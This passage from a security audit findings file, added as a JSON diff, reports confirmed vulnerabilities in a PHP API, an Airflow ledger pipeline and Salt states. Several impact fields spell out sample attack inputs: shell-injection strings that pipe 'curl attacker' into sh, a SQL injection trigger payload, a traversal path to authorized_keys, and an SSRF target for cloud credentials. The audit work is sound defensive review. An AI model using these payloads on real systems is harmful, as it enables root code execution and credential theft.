+          "reason": "Ingress: the Origin request header, read at public/index.php:29."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/public/index.php:30",
+          "support-desk-api/public/index.php:33",
+          "support-desk-api/public/index.php:34",
+          "support-desk-api/config/settings.php:24",
+          "support-desk-api/config/settings.php:25"
+        ],
+        "established_by": "public/index.php:30 substitutes the caller's Origin for the configured '*'",
+        "narrowed_by": "An operator who sets a concrete origin in settings.php:24 disables the reflection branch; the shipped default does not"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api/src/Middleware/AuthMiddleware.php",
+          "for": "whether ambient cookie credentials are actually accepted (without that, the CORS reflection would be far less useful)",
+          "found": "they are -- :37 falls back to the desk_session cookie when no Authorization header is present"
+        },
+        {
+          "looked_in": "support-desk-api/public/index.php",
+          "for": "a CSRF token check or SameSite enforcement anywhere in the stack",
+          "found": "nothing; the OPTIONS catch-all at :45 answers every preflight affirmatively"
+        }
+      ]
+    },
+    {
+      "title": "Legacy search concatenates the q parameter into a raw query executed with PDO::query",
+      "location": {
+        "path": "support-desk-api/src/Controllers/LegacySearchController.php",
+        "symbol": "LegacySearchController::search",
+        "line": 27
+      },
+      "cwe": "CWE-89",
+      "class": "sql injection",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "LegacySearchController.php:24 reads $q from the query string and :26-28 interpolate it twice into LIKE '%\" . $q . \"%' with no binding; :30 runs it through $this->pdo->query(), which does not parameterise at all. The defect is complete and self-contained inside this method.",
+      "impact": "If this controller is ever routed -- the class docstring says it is kept 'until the old console is finally decommissioned' -- it is an unauthenticated full-table-read SQL injection. In the tree as it stands nothing constructs it, so today it is dormant code carrying a live defect.",
+      "recommendation": "Delete the class, or bind $q as a parameter before anyone re-mounts it.",
+      "triage": [
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "I traced reachability rather than dismissing it for being legacy: a repo-wide grep for LegacySearch returns only the class declaration itself, so it is not routed in public/index.php today. That is what caps the severity at low, not the file's name."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 explicitly keeps a direct injection path in a function's own logic VALID even when nothing calls it, which is why this is reported rather than dropped."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "File and lines 24-30 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "No live ingress exists in this tree because the class is unrouted; the sink is intrinsic, which is the basis for reporting it under FP-08."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Controllers/LegacySearchController.php:27",
+          "support-desk-api/src/Controllers/LegacySearchController.php:30"
+        ],
+        "established_by": "LegacySearchController.php:26-28 -- string interpolation into the SQL text",
+        "narrowed_by": "Unrouted: public/index.php never imports or instantiates the class, so there is no path to it in the current tree"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api (grep LegacySearch)",
+          "for": "a route, container binding or factory that would mount it",
+          "found": "only src/Controllers/LegacySearchController.php:16, the class declaration"
+        },
+        {
+          "looked_in": "support-desk-api/composer.json",
+          "for": "a PSR-4 autoload or script that would pull it into a running process on its own",
+          "found": "App\\ => src/ autoload only, which makes it loadable but not reachable"
+        }
+      ]
+    },
+    {
+      "title": "Session token digest compared with the loose != operator",
+      "location": {
+        "path": "support-desk-api/src/Middleware/AuthMiddleware.php",
+        "symbol": "AuthMiddleware::process",
+        "line": 58
+      },
+      "cwe": "CWE-697",
+      "class": "incorrect comparison",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "AuthMiddleware.php:58 reads if ($session['token_digest'] != $digest) -- loose, not strict, and not constant time. Both operands are 64-char sha256 hex from :43 and the api_sessions row.",
+      "impact": "Under PHP 8 two numeric strings still compare numerically, so two all-digit digests that differ only in leading zeros would compare equal; the probability of an all-digit sha256 hex digest is about 6e-14, so this is a correctness and side-channel defect rather than a practical bypass. The byte-wise early exit is also not constant time.",
+      "recommendation": "Use hash_equals($session['token_digest'], $digest).",
+      "triage": [
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "I could not construct a triggerable path: forging a token whose digest is all-digits requires ~10^13 offline attempts per target row and gains nothing an attacker could not get by other means. Reported at low precisely because reproducibility is doubtful."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Comparing an authentication secret with != rather than hash_equals is a named weakness, not a style preference."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Line 58 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the Authorization header or desk_session cookie at AuthMiddleware.php:34-37."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Middleware/AuthMiddleware.php:58"
+        ],
+        "established_by": "AuthMiddleware.php:58 uses != on a secret digest",
+        "narrowed_by": "The prefix lookup at :50 narrows the comparison to a single row, and both operands are hex digests, which makes the numeric-juggling branch astronomically unlikely"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api/src/Middleware/AuthMiddleware.php",
+          "for": "a second, strict comparison elsewhere on the path that would make this one redundant",
+          "found": "nothing -- :58 is the only place the full secret is verified"
+        },
+        {
+          "looked_in": "support-desk-api/src/Controllers/AdminController.php",
+          "for": "how the digest is produced, to confirm both sides are hex",
+          "found": "hash('sha256', $secret) at :71 over bin2hex(random_bytes(24)) at :66 -- both sides are lowercase hex"
+        }
+      ]
+    },
+    {
+      "title": "LedgerUpsertOperator interpolates the trigger payload into the merge statement",
+      "location": {
+        "path": "ledger-etl-airflow/plugins/ledger/operators.py",
+        "symbol": "LedgerUpsertOperator.execute",
+        "line": 37
+      },
+      "cwe": "CWE-89",
+      "class": "sql injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "operators.py:29-41 builds the statement with an f-string: partition lands in two SQL literals at :34 and :36, and accounts is spliced into the IN list at :37 with the default \"'*'\". accounts is read at :30 straight from dag_run.conf and is validated nowhere in the tree. The reference statement the repo keeps beside it, sql/upsert_ledger.sql:10-12, uses %(partition)s placeholders -- the operator diverges from its own documented shape.",
+      "impact": "Anyone who can trigger ledger_sync (airflow dags trigger -c '{\"accounts\": \"1) OR TRUE--\"}') executes arbitrary SQL as the warehouse connection: rewrite postings, read any table the ledger role can reach, or chain to COPY/large-object primitives on Postgres.",
+      "recommendation": "Bind partition and the account list as parameters through PostgresHook.run(..., parameters=...), mirroring sql/upsert_ledger.sql.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The operator itself reads dag_run.conf at :28-30; no hypothetical caller is required."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the opposite of pedantry -- the safe form exists in the same repo and this code does not use it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "operators.py:29-41 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: dag_run.conf at operators.py:28, plus the templated partition at dags/ledger_sync.py:82."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/plugins/ledger/operators.py:34",
+          "ledger-etl-airflow/plugins/ledger/operators.py:36",
+          "ledger-etl-airflow/plugins/ledger/operators.py:37",
+          "ledger-etl-airflow/dags/ledger_sync.py:82"
+        ],
+        "established_by": "operators.py:32-41 -- an f-string SQL body with two caller-controlled interpolations",
+        "narrowed_by": "Requires the ability to trigger the ledger_sync DAG with a conf payload"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow/dags/ledger_sync.py",
+          "for": "a validate_conf gate upstream of upsert_postings like the one reconcile.py has",
+          "found": "nothing -- the chain at :85 is wait_for_close >> pull_vendor_delivery >> load_delivery >> rollups >> upsert, with no validation task anywhere"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger/settings.py",
+          "for": "a regex or allowlist applied to accounts",
+          "found": "PARTITION_RE exists at :10 but is referenced only by reconcile.py:31; nothing constrains accounts anywhere in the tree"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/sql/upsert_ledger.sql",
+          "for": "whether the parameterised form was ever the intended shape",
+          "found": "yes -- %(partition)s at :10, :12 and :21"
+        }
+      ]
+    },
+    {
+      "title": "Trigger payload is templated into a BashOperator command",
+      "location": {
+        "path": "ledger-etl-airflow/dags/ledger_sync.py",
+        "symbol": "wait_for_close",
+        "line": 51
+      },
+      "cwe": "CWE-78",
+      "class": "command injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "ledger_sync.py:47-54 renders bash_command as \"test -f /mnt/upstream/close/{{ dag_run.conf.get('partition', ds) }}/_SUCCESS && echo close marker present\". Airflow renders the Jinja into the string and BashOperator hands the result to a shell. The sibling rollup tasks at :70-78 avoid this by passing values through params from the fixed settings.REGIONS tuple -- the unsafe one is the task that takes the trigger payload.",
+      "impact": "A payload of {\"partition\": \"x/_SUCCESS; curl attacker/x | sh #\"} runs as the Airflow worker user, which holds the warehouse connection and the /mnt/upstream and /mnt/finance-share mounts.",
+      "recommendation": "Pass the partition through params and reference it as an environment variable, and validate it with settings.PARTITION_RE before the DAG uses it, as reconcile.py does.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The DAG file itself composes the command; nothing hypothetical."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Directly triggerable with a single documented CLI invocation -- the docstring at ledger_sync.py:6 shows the exact -c syntax."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Lines 47-54 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: dag_run.conf['partition'] at ledger_sync.py:51."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/dags/ledger_sync.py:51"
+        ],
+        "established_by": "ledger_sync.py:49-53 -- an unquoted Jinja expression inside a bash_command",
+        "narrowed_by": "Requires DAG-trigger rights; the ds fallback is safe when no conf is supplied"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger/settings.py",
+          "for": "whether PARTITION_RE is applied on this DAG's path",
+          "found": "it is defined at :10 but ledger_sync.py never imports or calls it -- only reconcile.py:31 does"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/dags/ledger_sync.py",
+          "for": "other templated bash commands and whether they are safe",
+          "found": "the rollup tasks at :72-76 template only params.region and params.work_root, both from settings, so they are not injectable"
+        }
+      ]
+    },
+    {
+      "title": "Vendor delivery tar is extracted with no member path validation",
+      "location": {
+        "path": "ledger-etl-airflow/plugins/ledger/transforms.py",
+        "symbol": "unpack_archive",
+        "line": 51
+      },
+      "cwe": "CWE-22",
+      "class": "path traversal",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "transforms.py:49-51 opens the archive with mode 'r:*' and calls tar.extractall(path=destination) with no filter= argument and no member inspection. The list comprehension at :50 only counts regular files for the log line at :53 -- it does not gate what is extracted. The archive comes from VendorDeliveryOperator (operators.py:63-71), whose URL is caller-supplied.",
+      "impact": "A member named ../../../../home/airflow/.ssh/authorized_keys or a dags/ path writes outside destination as the Airflow worker. Writing into the DAGs folder is code execution on the scheduler at the next parse.",
+      "recommendation": "Pass filter='data' (Python 3.12+) or reject any member whose resolved path escapes destination before extracting.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The unsafe extraction is inside this function, and its only in-tree caller feeds it an attacker-reachable archive."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The finding is arbitrary file write, not decompression-bomb resource exhaustion."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "transforms.py:44-55 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: dag_run.conf['delivery_url'] at dags/ledger_sync.py:58 -> operators.py:61 -> the manifest's 'archive' field at operators.py:64 -> bytes written at :69 -> extracted at transforms.py:51."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/plugins/ledger/transforms.py:51",
+          "ledger-etl-airflow/plugins/ledger/operators.py:71"
+        ],
+        "established_by": "transforms.py:51 -- extractall with no filter and no member check",
+        "narrowed_by": "Needs either DAG-trigger rights (to set delivery_url) or control of the default vendor host"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow (grep unpack_archive)",
+          "for": "a caller that pre-validates archive members",
+          "found": "one caller, operators.py:71, with no validation between the download at :69 and the extraction"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger/transforms.py",
+          "for": "a containment check on the returned paths at :55",
+          "found": "nothing -- os.path.join(destination, m.name) reproduces the traversal rather than catching it"
+        }
+      ]
+    },
+    {
+      "title": "Vendor delivery fetch bypasses the host allowlist its sibling helper enforces",
+      "location": {
+        "path": "ledger-etl-airflow/plugins/ledger/operators.py",
+        "symbol": "VendorDeliveryOperator.execute",
+        "line": 63
+      },
+      "cwe": "CWE-918",
+      "class": "server side request forgery",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "hooks.fetch_reference (hooks.py:49-59) parses the host and raises unless it is in settings.ALLOWED_FETCH_HOSTS. hooks.fetch_json (:31-37) and hooks.fetch_bytes (:40-46) have no such check. VendorDeliveryOperator uses the unchecked pair: :63 fetch_json(url + \"/manifest.json\") where url comes from dag_run.conf['delivery_url'] (:61, templated at dags/ledger_sync.py:58), and :69 fetch_bytes(archive_url) where archive_url is whatever the fetched manifest says at :64 -- a second hop the operator never validates.",
+      "impact": "A trigger payload points the worker at any address the Airflow network can reach, including 169.254.169.254 for cloud instance credentials and internal admin services; the response body is written to disk and, via unpack_archive, onto the filesystem. The manifest's archive field gives a redirect-style second hop even when the first URL looks legitimate.",
+      "recommendation": "Route both helpers through the same ALLOWED_FETCH_HOSTS check fetch_reference already implements, and re-validate archive_url after parsing the manifest.",
+      "triage": [
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "I am not inventing a bypass of a working mitigation -- the mitigation exists on a different function and this path simply does not call it."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "fetch_reference's allowlist does work; it is just not on this path."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "hooks.py:31-59 and operators.py:59-71 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: dag_run.conf['delivery_url'] at dags/ledger_sync.py:58 and operators.py:61."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/plugins/ledger/operators.py:63",
+          "ledger-etl-airflow/plugins/ledger/operators.py:69",
+          "ledger-etl-airflow/plugins/ledger/hooks.py:31",
+          "ledger-etl-airflow/plugins/ledger/hooks.py:40"
+        ],
+        "established_by": "hooks.py:31-46 -- fetch_json/fetch_bytes issue the request with no host check",
+        "narrowed_by": "Requires DAG-trigger rights to set delivery_url; the DAG default at ledger_sync.py:58 points at an internal host"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow (grep fetch_json/fetch_bytes/fetch_reference)",
+          "for": "whether the allowlisted helper is used on this path anywhere",
+          "found": "fetch_reference has exactly one caller, reconcile.py:52; the vendor path uses only the unchecked two"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger/settings.py",
+          "for": "whether ALLOWED_FETCH_HOSTS is consulted anywhere else",
+          "found": "referenced only at hooks.py:52"
+        }
+      ]
+    },
+    {
+      "title": "Warehouse connection URI, including its password, is written to the pipeline log",
+      "location": {
+        "path": "ledger-etl-airflow/plugins/ledger/hooks.py",
+        "symbol": "warehouse",
+        "line": 19
+      },
+      "cwe": "CWE-532",
+      "class": "sensitive data in logs",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "hooks.py:19 logs log.info(\"ledger warehouse target: %s\", conn.get_uri()). Airflow's Connection.get_uri() serialises the full DSN with the password embedded in the userinfo component. The 'ledger' logger is wired at config/airflow_local_settings.py:30-34 to the ledger_file handler (a 50MB RotatingFileHandler at /opt/airflow/logs/ledger-pipeline.log, :19-26) and to console, with no redaction filter -- 'filters': [] at :25.",
+      "impact": "The warehouse password is written in cleartext to a shared log file and to the task console output that any Airflow UI user can read, on every task that opens the warehouse. It survives in five rotated backups.",
+      "recommendation": "Log conn.host and conn.schema, never get_uri(); or attach Airflow's SecretsMasker to the ledger handler instead of the empty filter list.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Writing a live credential to a readable file is a disclosure, not a missing hardening measure."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "hooks.py:19 and airflow_local_settings.py:19-34 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a data-flow-from-attacker finding: the sensitive value originates inside the system and flows outward to a lower-trust sink."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/plugins/ledger/hooks.py:19",
+          "ledger-etl-airflow/config/airflow_local_settings.py:30"
+        ],
+        "established_by": "hooks.py:19 -- get_uri() passed to a log record",
+        "narrowed_by": "Reader needs access to the Airflow log volume or the task-log view in the UI"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow/config/airflow_local_settings.py",
+          "for": "a masking filter on the ledger handler",
+          "found": "'filters': [] at :25 -- explicitly empty"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger",
+          "for": "other places a secret reaches a logger",
+          "found": "nothing comparable; the other log calls carry counts, paths and partition names"
+        }
+      ]
+    },
+    {
+      "title": "Staged ledger CSV is chmod'ed world-writable before the COPY reads it",
+      "location": {
+        "path": "ledger-etl-airflow/plugins/ledger/transforms.py",
+        "symbol": "stage_csv",
+        "line": 91
+      },
+      "cwe": "CWE-732",
+      "class": "incorrect permission assignment",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "transforms.py:91 os.chmod(path, 0o666) with the comment at :90 explaining the COPY runs as the postgres service account. 0o666 grants write to every local account, not to postgres specifically. The file is the normalised posting set produced at :85-88 and consumed by the upsert step.",
+      "impact": "Any local account on the worker rewrites amounts, accounts or currencies in the window between staging and the COPY, and the falsified rows land in ledger.postings. This is a financial-integrity path, not a confidentiality one.",
+      "recommendation": "chown/chgrp the file to the postgres group and use 0o640, or hand the data over through a socket/STDIN COPY instead of a shared file.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "World-writable is an actively granted permission, not an omitted hardening step."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The chmod is in this function's own logic; no caller misuse needed."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "transforms.py:80-93 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted writer is any local uid on the worker; the file at transforms.py:83 is the writable object."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "ledger-etl-airflow/plugins/ledger/transforms.py:91"
+        ],
+        "established_by": "transforms.py:91 -- the explicit 0o666 mode",
+        "narrowed_by": "Requires an existing local account on the Airflow worker"
+      },
+      "searched": [
+        {
+          "looked_in": "ledger-etl-airflow (grep stage_csv)",
+          "for": "every file this mode is applied to",
+          "found": "two call sites, dags/ledger_sync.py:29 and operators.py:97, both of which route through the same chmod"
+        },
+        {
+          "looked_in": "ledger-etl-airflow/plugins/ledger/transforms.py",
+          "for": "a narrower mode or an ownership change elsewhere in the module",
+          "found": "nothing -- 0o666 at :91 is the only chmod in the tree"
+        }
+      ]
+    },
+    {
+      "title": "Fleet manifest is parsed with yaml.Loader, which constructs arbitrary Python objects",
+      "location": {
+        "path": "edge-fleet-salt/salt/_modules/fleetctl.py",
+        "symbol": "manifest",
+        "line": 41
+      },
+      "cwe": "CWE-502",
+      "class": "unsafe deserialization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "fleetctl.py:38-41 fetches the manifest over HTTP and returns yaml.load(resp.text, Loader=yaml.Loader). yaml.Loader is the full constructor -- it honours !!python/object/apply and executes on load. The url defaults to the pillar value but is also a plain function argument (:31, :37), and this module is synced to every minion (module docstring :3-4).",
+      "impact": "Whoever answers the manifest URL executes code as root on every edge node that runs a state calling fleetctl.manifest. The pillar default is https, but any operator or reactor may pass url= directly, and a control-plane compromise reaches the whole fleet in one converge.",
+      "recommendation": "yaml.safe_load, and pin the manifest host.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 04 credits standard SAFE library use; yaml.Loader is the documented unsafe loader and safe_load is the safe sibling."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 keeps an intrinsic flaw valid regardless of call sites, which matters here because no in-tree sls calls fleetctl.manifest."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "fleetctl.py:31-41 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the HTTP response body at fleetctl.py:38, plus the caller-supplied url parameter at :31."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/_modules/fleetctl.py:41"
+        ],
+        "established_by": "fleetctl.py:41 -- Loader=yaml.Loader",
+        "narrowed_by": "Needs a position on the manifest URL, or the right to pass url= to the execution module"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt (grep fleetctl.)",
+          "for": "an in-tree sls that calls fleetctl.manifest",
+          "found": "none -- only enrollment.py:29 calls fleetctl.enroll; manifest is reachable from the CLI, a reactor or an external state, which is how execution modules are used"
+        },
+        {
+          "looked_in": "edge-fleet-salt/pillar/fleet.sls",
+          "for": "whether manifest_url is https and therefore harder to hijack",
+          "found": "https at :6 -- which narrows the network attacker but not an operator or a compromised control plane"
+        }
+      ]
+    },
+    {
+      "title": "drain() concatenates node_id into a shell command while rotate_key() validates the same argument",
+      "location": {
+        "path": "edge-fleet-salt/salt/_modules/fleetctl.py",
+        "symbol": "drain",
+        "line": 48
+      },
+      "cwe": "CWE-78",
+      "class": "command injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "fleetctl.py:46-57 builds AGENT_BIN + \" drain --node \" + node_id + ... and runs it with shell=True (:56) -- the pipe to tee at :52 is why the shell is there. rotate_key, immediately below at :62-74, takes the same node_id, checks it against NODE_RE (:64-65) and then uses an argv list with no shell (:67-72). The validating regex exists in the module and is applied to one function and not the other.",
+      "impact": "fleetctl.drain with node_id='x; curl attacker|sh' executes as root on the target minion. Salt execution modules are callable from the master CLI, from a reactor and from any sls, so this is the fleet's remote-execution primitive.",
+      "recommendation": "Apply NODE_RE in drain as rotate_key does, and drop shell=True by writing the log through the Python side instead of tee.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The concatenation and shell=True are inside drain itself; no caller misuse is assumed."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A direct injection path in the function's own logic stays valid even with no in-tree caller."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "fleetctl.py:44-74 re-read verbatim; NODE_RE is defined at :20."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the node_id parameter at fleetctl.py:44, supplied by whoever invokes the module (CLI, reactor, sls)."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/_modules/fleetctl.py:48",
+          "edge-fleet-salt/salt/_modules/fleetctl.py:56"
+        ],
+        "established_by": "fleetctl.py:46-56 -- string-built command run with shell=True",
+        "narrowed_by": "wait_seconds is int()-cast at :51, so only node_id is injectable"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/_modules/fleetctl.py",
+          "for": "a validation of node_id anywhere before the concatenation",
+          "found": "nothing in drain; NODE_RE at :20 is used only by rotate_key at :64"
+        },
+        {
+          "looked_in": "edge-fleet-salt (grep fleetctl.)",
+          "for": "in-tree callers that might constrain node_id",
+          "found": "only enrollment.py:29 (fleetctl.enroll); drain has no in-tree caller, which is why rule 08 governs"
+        }
+      ]
+    },
+    {
+      "title": "CMDB-sourced label string is interpolated into a root cmd.run",
+      "location": {
+        "path": "edge-fleet-salt/salt/telemetry/init.sls",
+        "symbol": "telemetry-register-node",
+        "line": 38
+      },
+      "cwe": "CWE-78",
+      "class": "command injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "telemetry/init.sls:2 binds labels = telemetry.get('extra_labels', '') and :34-38 drops it unquoted at the end of a cmd.run command line. pillar/fleet.sls:20-22 documents where that value comes from: 'Mirrored out of the CMDB asset record by the nightly pillar sync, so it changes whenever someone edits the rack entry in the asset browser.' The two values above it on the same command are structurally safer -- bucket comes from a fixed pillar key and rack is a grain -- but extra_labels crosses a trust boundary the sls treats as trusted.",
+      "impact": "Anyone who can edit a rack's asset-browser entry sets extra_labels to '; curl attacker|sh #' and gets root command execution on every edge node at the next converge. The CMDB editor population is far wider than the set of people who may push Salt states.",
+      "recommendation": "Pass the labels as a list and let Salt build argv, or shell-quote the value in the Jinja; better, validate it against a key=value regex in the pillar before it reaches a command line.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The sls itself performs the interpolation into a command it also executes."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a test or mock path -- telemetry is applied by salt/top.sls:8 and :11 to the edge-proxy and collector roles."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "telemetry/init.sls:1-40 and pillar/fleet.sls:16-23 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the CMDB asset record documented at pillar/fleet.sls:20-22, entering the render at telemetry/init.sls:2 and reaching the sink at :38."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/telemetry/init.sls:38",
+          "edge-fleet-salt/salt/telemetry/init.sls:2",
+          "edge-fleet-salt/pillar/fleet.sls:22"
+        ],
+        "established_by": "telemetry/init.sls:34-38 -- an unquoted Jinja expansion inside a cmd.run name",
+        "narrowed_by": "Requires write access to the CMDB asset record that the nightly pillar sync mirrors"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/top.sls",
+          "for": "whether the telemetry state is actually applied to real nodes",
+          "found": "yes -- assigned to roles:edge-proxy (:8) and roles:collector (:11)"
+        },
+        {
+          "looked_in": "edge-fleet-salt/pillar/fleet.sls",
+          "for": "any validation or quoting applied to extra_labels before it reaches the state",
+          "found": "nothing -- :22 is a plain string with the CMDB provenance noted in the comment above it"
+        }
+      ]
+    },
+    {
+      "title": "Telemetry agent package is fetched over plain HTTP with no source_hash and installed as root",
+      "location": {
+        "path": "edge-fleet-salt/salt/telemetry/init.sls",
+        "symbol": "telemetry-agent-package",
+        "line": 8
+      },
+      "cwe": "CWE-494",
+      "class": "download of code without integrity check",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "pillar/fleet.sls:23 sets agent_package_url to http://packages.internal.example/edge/telemetry-agent_3.4.1_amd64.deb -- plain HTTP. telemetry/init.sls:6-10 fetches it with file.managed and no source_hash argument, and :12-17 installs it with dpkg -i as root. Every other URL in the pillar (:4, :5, :6, :19) is https; the package URL is the one that is not.",
+      "impact": "Anyone able to answer or intercept that hostname serves a substitute .deb whose maintainer scripts run as root on every edge-proxy and collector node at the next converge.",
+      "recommendation": "Serve the package over https and add a source_hash pinning the .deb, so Salt refuses a substituted artefact even on a plaintext hop.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a missing hardening header; the integrity control for this exact Salt primitive (source_hash) is absent on a root package install."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Triggerable by anyone with a network position or DNS control on the internal path -- no timing or race required."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "fleet.sls:23 and telemetry/init.sls:5-17 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the HTTP response body from the URL at pillar/fleet.sls:23, consumed at telemetry/init.sls:8."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/telemetry/init.sls:8",
+          "edge-fleet-salt/pillar/fleet.sls:23"
+        ],
+        "established_by": "telemetry/init.sls:6-10 -- file.managed from an http:// source with no source_hash",
+        "narrowed_by": "The host is internal, so the attacker needs to be on the internal network or control internal DNS"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/telemetry/init.sls",
+          "for": "a source_hash, skip_verify or gpg check on the package state",
+          "found": "nothing -- the state has name, source, makedirs and mode only"
+        },
+        {
+          "looked_in": "edge-fleet-salt/pillar/fleet.sls",
